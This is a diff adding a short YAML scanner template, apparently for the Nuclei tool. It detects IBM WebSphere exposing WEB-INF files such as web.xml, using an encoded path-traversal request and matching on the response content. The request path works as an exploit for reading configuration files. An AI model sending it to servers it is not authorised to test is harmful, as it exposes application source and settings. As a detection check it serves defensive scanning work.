@@ -1,0 +1,27 @@
+id: ibm-websphere-exposure
+
+info:
+  name: IBM WebSphere application source file exposure
+  author: r3nz0
+  severity: medium
+  description: Disclose application specific files contained within the war file, including files under the web-inf and meta-inf directories
+  tags: ibm,websphere,exposure
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/iojs/%2e/WEB-INF/web.xml"
+      - "{{BaseURL}}/iojs/%2e/WEB-INF/"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "web-app"
+          - "context-param"
+        condition: and
+
+      - type: status
+        status:
+          - 200
